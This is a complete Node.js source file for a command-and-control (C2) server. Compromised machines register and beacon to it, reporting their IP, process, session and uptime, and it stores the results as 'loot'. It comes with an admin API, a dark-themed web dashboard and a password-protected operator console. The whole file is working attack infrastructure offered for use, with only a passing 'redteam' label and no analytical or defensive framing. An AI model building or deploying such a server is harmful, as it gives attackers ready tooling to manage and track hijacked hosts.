/*
 * Minimal C2 Server for Beacon Reception
 * Run: node c2-server.js
 */

const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');
const readline = require('readline');

// ==================== CONFIGURATION ====================
const PORT = process.env.PORT || 8080;
const C2_PASSWORD = 'redteam2024';  // Local console password
const ADMIN_SECRET = 'redteam2024-secret-key-xyz';  // Remote API secret
const DATA_DIR = path.join(__dirname, 'loot');
const BOTS_FILE = path.join(DATA_DIR, 'bots.json');
// =======================================================

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Load existing bots or initialize
let bots = {};
if (fs.existsSync(BOTS_FILE)) {
    try {
        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf8'));
    } catch (e) {
        console.error('[ERROR] Failed to parse bots.json, starting fresh');
        bots = {};
    }
}

// ==================== UTILITY FUNCTIONS ====================

function formatTimestamp() {
    const now = new Date();
    return now.toISOString().replace('T', ' ').substring(0, 19);
}

function saveBots() {
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

function updateBot(botId, data) {
    if (!bots[botId]) {
        bots[botId] = {
            id: botId,
            firstSeen: formatTimestamp(),
            beacons: []
        };
        console.log(`\x1b[32m[+] New bot registered: ${botId}\x1b[0m`);
    }
    
    bots[botId].lastSeen = formatTimestamp();
    bots[botId].lastBeacon = data;
    bots[botId].beacons.push({
        timestamp: formatTimestamp(),
        ...data
    });
    
    // Keep only last 100 beacons per bot
    if (bots[botId].beacons.length > 100) {
        bots[botId].beacons = bots[botId].beacons.slice(-100);
    }
    
    saveBots();
}

function checkAdminAuth(req, res) {
    const parsedUrl = url.parse(req.url, true);
    const querySecret = parsedUrl.query.secret;
    const authHeader = req.headers['x-admin-secret'];
    
    if (querySecret === ADMIN_SECRET || authHeader === ADMIN_SECRET) {
        return true;
    }
    return false;
}

// ==================== HTTP SERVER ====================

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;
    const query = parsedUrl.query;
    
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Admin-Secret');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // ===== HEALTH CHECK =====
    if (pathname === '/health' && req.method === 'GET') {
        const botCount = Object.keys(bots).length;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: formatTimestamp(),
            bots: botCount,
            uptime: process.uptime()
        }));
        return;
    }
    
    // ===== BOT REGISTRATION =====
    if (pathname === '/register' && req.method === 'GET') {
        const botId = query.bot || 'unknown';
        
        updateBot(botId, { 
            event: 'register',
            userAgent: req.headers['user-agent'],
            ip: req.socket.remoteAddress 
        });
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', id: botId }));
        return;
    }
    
    // ===== BEACON RECEPTION =====
    if (pathname === '/beacon' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const params = new URLSearchParams(body);
            const botId = params.get('bot') || 'unknown';
            
            const beaconData = {
                event: 'beacon',
                uptime: params.get('uptime'),
                tick: params.get('tick'),
                proc: params.get('proc'),
                session: params.get('session'),
                ip: req.socket.remoteAddress
            };
            
            updateBot(botId, beaconData);
            
            const timestamp = formatTimestamp();
            console.log(`\x1b[36m[*] Beacon from ${botId} @ ${timestamp}\x1b[0m`);
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok' }));
        });
        return;
    }
    
    // ===== ADMIN: GET ALL BOTS =====
    if (pathname === '/admin/bots' && req.method === 'GET') {
        if (!checkAdminAuth(req, res)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Unauthorized' }));
            return;
        }
        
        const botList = Object.keys(bots).map(id => ({
            id: id,
            firstSeen: bots[id].firstSeen,
            lastSeen: bots[id].lastSeen,
            beaconCount: bots[id].beacons?.length || 0,
            lastBeacon: bots[id].lastBeacon
        }));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: botList.length,
            timestamp: formatTimestamp(),
            bots: botList
        }, null, 2));
        return;
    }
    
    // ===== ADMIN: GET SPECIFIC BOT =====
    if (pathname.startsWith('/admin/bots/') && req.method === 'GET') {
        if (!checkAdminAuth(req, res)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Unauthorized' }));
            return;
        }
        
        const botId = decodeURIComponent(pathname.replace('/admin/bots/', ''));
        const bot = bots[botId];
        
        if (!bot) {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Bot not found' }));
            return;
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            id: botId,
            firstSeen: bot.firstSeen,
            lastSeen: bot.lastSeen,
            beacons: bot.beacons?.slice(-20) || [],
            totalBeacons: bot.beacons?.length || 0
        }, null, 2));
        return;
    }
    
    // ===== ADMIN: GET RECENT BEACONS =====
    if (pathname === '/admin/beacons' && req.method === 'GET') {
        if (!checkAdminAuth(req, res)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Unauthorized' }));
            return;
        }
        
        const limit = parseInt(query.limit) || 10;
        
        const allBeacons = [];
        Object.keys(bots).forEach(botId => {
            const bot = bots[botId];
            if (bot.beacons) {
                bot.beacons.slice(-50).forEach(b => {
                    allBeacons.push({
                        botId: botId,
                        ...b
                    });
                });
            }
        });
        
        // Sort by timestamp (newest first)
        allBeacons.sort((a, b) => {
            return (b.timestamp || '').localeCompare(a.timestamp || '');
        });
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: allBeacons.length,
            limit: limit,
            beacons: allBeacons.slice(0, limit)
        }, null, 2));
        return;
    }
    
    // ===== ADMIN: STATUS OVERVIEW =====
    if (pathname === '/admin/status' && req.method === 'GET') {
        if (!checkAdminAuth(req, res)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Unauthorized' }));
            return;
        }
        
        const botIds = Object.keys(bots);
        const activeBots = botIds.filter(id => {
            const lastSeen = bots[id].lastSeen;
            if (!lastSeen) return false;
            // Active if seen in last 24 hours
            const lastSeenDate = new Date(lastSeen);
            const now = new Date();
            return (now - lastSeenDate) < 24 * 60 * 60 * 1000;
        });
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            totalBots: botIds.length,
            activeBots: activeBots.length,
            serverUptime: process.uptime(),
            memoryUsage: process.memoryUsage(),
            timestamp: formatTimestamp()
        }, null, 2));
        return;
    }
    
    // ===== ADMIN DASHBOARD HTML =====
    if (pathname === '/admin' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <meta charset="UTF-8">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #0d1117; 
            color: #c9d1d9; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #58a6ff; 
            border-bottom: 1px solid #30363d; 
            padding-bottom: 10px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .card { 
            background: #161b22; 
            border: 1px solid #30363d; 
            border-radius: 6px; 
            padding: 20px; 
            margin-bottom: 20px;
        }
        .card-header {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #58a6ff;
        }
        input, button, select {
            background: #0d1117;
            color: #c9d1d9;
            border: 1px solid #30363d;
            padding: 10px 15px;
            border-radius: 6px;
            font-family: inherit;
            font-size: 14px;
        }
        button {
            background: #238636;
            color: white;
            border-color: #2ea043;
            cursor: pointer;
            margin-right: 10px;
        }
        button:hover { background: #2ea043; }
        button.secondary {
            background: #21262d;
            border-color: #30363d;
            color: #c9d1d9;
        }
        button.secondary:hover { background: #30363d; }
        pre {
            background: #0d1117;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            border: 1px solid #30363d;
            max-height: 500px;
            overflow-y: auto;
        }
        .bot-row {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid #30363d;
        }
        .bot-row:hover { background: #1a1f26; }
        .bot-id { color: #58a6ff; font-weight: bold; }
        .bot-last { color: #8b949e; font-size: 12px; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 15px;
            text-align: center;
        }
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #58a6ff;
        }
        .stat-label {
            color: #8b949e;
            font-size: 12px;
            text-transform: uppercase;
        }
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .tab {
            padding: 10px 20px;
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 6px;
            cursor: pointer;
        }
        .tab.active {
            background: #1f6feb;
            border-color: #58a6ff;
        }
        .hidden { display: none; }
        .status-badge {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-active { background: #3fb950; box-shadow: 0 0 8px #3fb950; }
        .status-inactive { background: #f85149; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ C2 Dashboard</h1>
        
        <div class="card">
            <div class="card-header">Authentication</div>
            <input type="password" id="secret" placeholder="Admin Secret Key" style="width: 300px;">
            <button onclick="saveSecret()">Set Secret</button>
            <span id="authStatus" style="margin-left: 15px; color: #8b949e;"></span>
        </div>
        
        <div id="mainPanel" class="hidden">
            <div class="stats" id="stats"></div>
            
            <div class="tabs">
                <div class="tab active" onclick="switchTab('bots')">🤖 Bots</div>
                <div class="tab" onclick="switchTab('beacons')">📡 Beacons</div>
                <div class="tab" onclick="switchTab('raw')">📋 Raw Data</div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <span id="panelTitle">Bots</span>
                    <button class="secondary" onclick="refreshData()" style="float: right;">🔄 Refresh</button>
                </div>
                <div id="botsPanel"></div>
                <div id="beaconsPanel" class="hidden"></div>
                <div id="rawPanel" class="hidden">
                    <pre id="rawOutput">Click refresh to load data...</pre>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let adminSecret = '';
        let currentTab = 'bots';
        let botsData = null;
        
        function saveSecret() {
            adminSecret = document.getElementById('secret').value;
            document.getElementById('authStatus').textContent = '✓ Secret saved';
            document.getElementById('authStatus').style.color = '#3fb950';
            document.getElementById('mainPanel').classList.remove('hidden');
            refreshData();
        }
        
        async function apiCall(endpoint) {
            if (!adminSecret) {
                alert('Please enter admin secret first');
                return null;
            }
            const res = await fetch(endpoint + '?secret=' + adminSecret);
            return await res.json();
        }
        
        async function refreshData() {
            if (!adminSecret) return;
            
            // Fetch all data
            const [status, bots, beacons] = await Promise.all([
                apiCall('/admin/status'),
                apiCall('/admin/bots'),
                apiCall('/admin/beacons?limit=20')
            ]);
            
            // Update stats
            document.getElementById('stats').innerHTML = \`
                <div class="stat-card">
                    <div class="stat-value">\${status?.totalBots || 0}</div>
                    <div class="stat-label">Total Bots</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">\${status?.activeBots || 0}</div>
                    <div class="stat-label">Active (24h)</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">\${Math.floor((status?.serverUptime || 0) / 60)}</div>
                    <div class="stat-label">Uptime (min)</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">\${beacons?.total || 0}</div>
                    <div class="stat-label">Recent Beacons</div>
                </div>
            \`;
            
            botsData = bots;
            updatePanel();
        }
        
        function updatePanel() {
            if (currentTab === 'bots') renderBots();
            else if (currentTab === 'beacons') renderBeacons();
            else if (currentTab === 'raw') renderRaw();
        }
        
        async function renderBots() {
            const bots = await apiCall('/admin/bots');
            if (!bots) return;
            
            let html = '';
            if (bots.bots && bots.bots.length > 0) {
                html = bots.bots.map(bot => {
                    const lastSeen = new Date(bot.lastSeen);
                    const now = new Date();
                    const isActive = (now - lastSeen) < 24 * 60 * 60 * 1000;
                    
                    return \`
                        <div class="bot-row" onclick="showBotDetails('\${bot.id}')" style="cursor: pointer;">
                            <div>
                                <span class="status-badge \${isActive ? 'status-active' : 'status-inactive'}"></span>
                                <span class="bot-id">\${bot.id}</span>
                            </div>
                            <div class="bot-last">
                                Beacons: \${bot.beaconCount} | Last: \${bot.lastSeen || 'never'}
                            </div>
                        </div>
                    \`;
                }).join('');
            } else {
                html = '<p style="color: #8b949e; text-align: center; padding: 40px;">No bots registered yet</p>';
            }
            document.getElementById('botsPanel').innerHTML = html;
        }
        
        async function renderBeacons() {
            const data = await apiCall('/admin/beacons?limit=30');
            if (!data) return;
            
            let html = '<div style="max-height: 500px; overflow-y: auto;">';
            if (data.beacons && data.beacons.length > 0) {
                html += data.beacons.map(b => \`
                    <div class="bot-row">
                        <div>
                            <span class="bot-id">\${b.botId}</span>
                            <span style="color: #8b949e; margin-left: 10px;">\${b.proc || 'unknown'}</span>
                        </div>
                        <div class="bot-last">
                            Uptime: \${b.uptime || '0'}min | \${b.timestamp || ''}
                        </div>
                    </div>
                \`).join('');
            } else {
                html += '<p style="color: #8b949e; text-align: center; padding: 40px;">No beacons received yet</p>';
            }
            html += '</div>';
            document.getElementById('beaconsPanel').innerHTML = html;
        }
        
        async function renderRaw() {
            const [status, bots, beacons] = await Promise.all([
                apiCall('/admin/status'),
                apiCall('/admin/bots'),
                apiCall('/admin/beacons?limit=10')
            ]);
            
            document.getElementById('rawOutput').textContent = JSON.stringify({
                status: status,
                bots: bots,
                recent_beacons: beacons
            }, null, 2);
        }
        
        async function showBotDetails(botId) {
            const data = await apiCall('/admin/bots/' + botId);
            alert(JSON.stringify(data, null, 2));
        }
        
        function switchTab(tab) {
            currentTab = tab;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            document.getElementById('panelTitle').textContent = 
                tab === 'bots' ? 'Registered Bots' : 
                tab === 'beacons' ? 'Recent Beacons' : 'Raw Data';
            
            document.getElementById('botsPanel').classList.add('hidden');
            document.getElementById('beaconsPanel').classList.add('hidden');
            document.getElementById('rawPanel').classList.add('hidden');
            
            if (tab === 'bots') document.getElementById('botsPanel').classList.remove('hidden');
            else if (tab === 'beacons') document.getElementById('beaconsPanel').classList.remove('hidden');
            else if (tab === 'raw') document.getElementById('rawPanel').classList.remove('hidden');
            
            updatePanel();
        }
        
        // Refresh every 30 seconds
        setInterval(() => { if (adminSecret) refreshData(); }, 30000);
    </script>
</body>
</html>
        `);
        return;
    }
    
    // ===== 404 =====
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Not found' }));
});

// ==================== START SERVER ====================

server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║                    C2 SERVER RUNNING                     ║
╠══════════════════════════════════════════════════════════╣
║  Port: ${PORT}                                                ║
║  Loot: ${DATA_DIR}                                  ║
║                                                          ║
║  Endpoints:                                              ║
║    /health        - Server health check                  ║
║    /register      - Bot registration                     ║
║    /beacon        - Beacon reception (POST)              ║
║    /admin         - Web dashboard                        ║
║    /admin/bots    - List all bots (API)                  ║
║    /admin/beacons - Recent beacons (API)                 ║
║    /admin/status  - Server status (API)                  ║
║                                                          ║
║  Admin Secret: ${ADMIN_SECRET.substring(0, 10)}...                       ║
║                                                          ║
║  Local Commands (type after password):                   ║
║    status  - Show all bots                               ║
║    beacons - Show recent beacons                         ║
║    bot <id>- Show specific bot details                   ║
║    clear   - Clear screen                                ║
║    exit    - Shutdown server                             ║
║    help    - Show this menu                              ║
╚══════════════════════════════════════════════════════════╝
`);
});

// ==================== LOCAL ADMIN CONSOLE ====================

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '\x1b[33mc2>\x1b[0m '
});

let authenticated = false;
let authAttempts = 0;

console.log('\x1b[31m[!] Password required for local admin console\x1b[0m');
rl.prompt();

rl.on('line', (line) => {
    const input = line.trim();
    
    if (!authenticated) {
        if (input === C2_PASSWORD) {
            authenticated = true;
            console.log('\x1b[32m[+] Authenticated. Type "help" for commands.\x1b[0m');
            rl.setPrompt('\x1b[33mc2>\x1b[0m ');
            rl.prompt();
        } else {
            authAttempts++;
            console.log('\x1b[31m[-] Invalid password\x1b[0m');
            if (authAttempts >= 3) {
                console.log('\x1b[31m[!] Too many attempts. Local console locked.\x1b[0m');
                console.log('\x1b[33m[!] Server still running. Use remote API with secret.\x1b[0m');
                rl.pause();
            } else {
                rl.prompt();
            }
        }
        return;
    }
    
    const args = input.split(/\s+/);
    const cmd = args[0].toLowerCase();
    
    switch (cmd) {
        case 'status':
        case 'bots':
            showStatus();
            break;
            
        case 'beacon':
        case 'beacons':
            showRecentBeacons(args[1] ? parseInt(args[1]) : 10);
            break;
            
        case 'bot':
            if (args[1]) {
                showBotDetails(args[1]);
            } else {
                console.log('\x1b[31mUsage: bot <bot_id>\x1b[0m');
            }
            break;
            
        case 'clear':
        case 'cls':
            console.clear();
            break;
            
        case 'help':
        case '?':
            showHelp();
            break;
            
        case 'exit':
        case 'quit':
            console.log('\x1b[33m[!] Shutting down...\x1b[0m');
            saveBots();
            rl.close();
            server.close();
            process.exit(0);
            break;
            
        case '':
            break;
            
        default:
            console.log(`\x1b[31mUnknown command: ${cmd}\x1b[0m`);
            console.log('\x1b[90mType "help" for available commands\x1b[0m');
    }
    
    rl.prompt();
});

rl.on('close', () => {
    console.log('\n\x1b[33m[!] Console closed. Server still running.\x1b[0m');
    console.log('\x1b[33m[!] Press Ctrl+C to stop server.\x1b[0m');
});

// ==================== DISPLAY FUNCTIONS ====================

function showHelp() {
    console.log(`
\x1b[36m┌────────────────────────────────────────────────────────┐
│                    AVAILABLE COMMANDS                     │
├──────────────────────────────────────────────────────────┤
│  status          - Show all bots and their status         │
│  beacons [n]     - Show last n beacons (default: 10)      │
│  bot <id>        - Show detailed info for specific bot    │
│  clear           - Clear the console screen               │
│  exit            - Shutdown C2 server                     │
│  help            - Show this help menu                    │
└──────────────────────────────────────────────────────────┘\x1b[0m
`);
}

function showStatus() {
    const botIds = Object.keys(bots);
    
    if (botIds.length === 0) {
        console.log('\x1b[33m[!] No bots have checked in yet.\x1b[0m');
        return;
    }
    
    console.log('\n\x1b[36m┌──────────────────────────────────────────────────────────────────────────────┐');
    console.log('│                              ACTIVE BOTS                                     │');
    console.log('├──────────────────────┬─────────────────────┬────────────┬────────────────────┤');
    console.log('│ Bot ID               │ Last Seen            │ Beacons    │ Process            │');
    console.log('├──────────────────────┼─────────────────────┼────────────┼────────────────────┤');
    
    botIds.forEach(id => {
        const bot = bots[id];
        const lastProc = bot.lastBeacon?.proc || 'unknown';
        const beaconCount = bot.beacons?.length || 0;
        
        console.log(`│ \x1b[32m${id.padEnd(20)}\x1b[0m │ ${(bot.lastSeen || 'never').padEnd(19)} │ ${beaconCount.toString().padEnd(10)} │ ${lastProc.padEnd(18)} │`);
    });
    
    console.log('└──────────────────────┴─────────────────────┴────────────┴────────────────────┘\x1b[0m\n');
    console.log(`\x1b[90mTotal bots: ${botIds.length}\x1b[0m`);
}

function showRecentBeacons(count = 10) {
    const allBeacons = [];
    
    Object.keys(bots).forEach(botId => {
        const bot = bots[botId];
        if (bot.beacons) {
            bot.beacons.forEach(b => {
                allBeacons.push({
                    botId: botId,
                    ...b
                });
            });
        }
    });
    
    allBeacons.sort((a, b) => b.timestamp.localeCompare(a.timestamp));
    
    const recent = allBeacons.slice(0, count);
    
    if (recent.length === 0) {
        console.log('\x1b[33m[!] No beacons received yet.\x1b[0m');
        return;
    }
    
    console.log(`\n\x1b[36m┌─────────────────────────────────────────────────────────────────────────────┐`);
    console.log(`│                         RECENT BEACONS (${recent.length})                              │`);
    console.log('├──────────────────────┬─────────────────────┬────────────┬────────────────────┤');
    console.log('│ Bot ID               │ Timestamp           │ Uptime(min)│ Process            │');
    console.log('├──────────────────────┼─────────────────────┼────────────┼────────────────────┤');
    
    recent.forEach(b => {
        const botId = (b.botId || 'unknown').substring(0, 20);
        const ts = (b.timestamp || '').substring(11, 19);
        const uptime = b.uptime || '0';
        const proc = (b.proc || 'unknown').substring(0, 18);
        
        console.log(`│ ${botId.padEnd(20)} │ ${ts.padEnd(19)} │ ${uptime.padEnd(10)} │ ${proc.padEnd(18)} │`);
    });
    
    console.log('└──────────────────────┴─────────────────────┴────────────┴────────────────────┘\x1b[0m\n');
}

function showBotDetails(botId) {
    const bot = bots[botId];
    
    if (!bot) {
        console.log(`\x1b[31m[-] Bot not found: ${botId}\x1b[0m`);
        return;
    }
    
    console.log(`\n\x1b[36m╔══════════════════════════════════════════════════════════════╗`);
    console.log(`║  BOT: ${botId.padEnd(54)}║`);
    console.log(`╠══════════════════════════════════════════════════════════════╣`);
    console.log(`║  First Seen: ${(bot.firstSeen || 'unknown').padEnd(47)}║`);
    console.log(`║  Last Seen:  ${(bot.lastSeen || 'unknown').padEnd(47)}║`);
    console.log(`║  Total Beacons: ${bot.beacons?.length.toString().padEnd(43)}║`);
    
    if (bot.lastBeacon) {
        console.log(`╠══════════════════════════════════════════════════════════════╣`);
        console.log(`║  LAST BEACON DATA:                                           ║`);
        console.log(`║    Process:  ${(bot.lastBeacon.proc || 'unknown').padEnd(46)}║`);
        console.log(`║    Session:  ${(bot.lastBeacon.session || 'unknown').padEnd(46)}║`);
        console.log(`║    Uptime:   ${(bot.lastBeacon.uptime || '0').padEnd(46)}║`);
        console.log(`║    IP:       ${(bot.lastBeacon.ip || 'unknown').padEnd(46)}║`);
    }
    
    if (bot.beacons && bot.beacons.length > 0) {
        console.log(`╠══════════════════════════════════════════════════════════════╣`);
        console.log(`║  RECENT BEACON HISTORY:                                      ║`);
        
        const recent = bot.beacons.slice(-5).reverse();
        recent.forEach(b => {
            const ts = (b.timestamp || '').substring(11, 19);
            console.log(`║    ${ts} - uptime: ${(b.uptime || '0').padEnd(6)} proc: ${(b.proc || 'unknown').padEnd(20)}║`);
        });
    }
    
    console.log(`╚══════════════════════════════════════════════════════════════╝\x1b[0m\n`);
}

// ==================== GRACEFUL SHUTDOWN ====================

process.on('SIGINT', () => {
    console.log('\n\x1b[33m[!] Received SIGINT. Shutting down...\x1b[0m');
    saveBots();
    server.close();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n\x1b[33m[!] Received SIGTERM. Shutting down...\x1b[0m');
    saveBots();
    server.close();
    process.exit(0);
});
